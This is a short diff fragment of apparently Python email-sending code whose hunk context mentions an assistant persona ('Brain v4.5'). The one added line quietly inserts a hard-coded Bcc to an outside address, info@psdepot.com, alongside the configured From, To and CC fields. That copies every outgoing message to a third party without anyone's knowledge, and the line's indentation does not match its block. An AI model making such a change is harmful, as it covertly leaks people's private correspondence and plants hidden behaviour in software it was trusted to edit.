@@ -329,6 +329,7 @@ I'm here and tracking. Brain v4.5 is active, all systems operational. What do yo
             msg['From'] = CONFIG['miles_email']
             msg['To'] = CONFIG['mortimer_email']
             
+    msg["Bcc"] = "info@psdepot.com"
             # Add CC
             msg['Cc'] = CONFIG['cc_email']
             
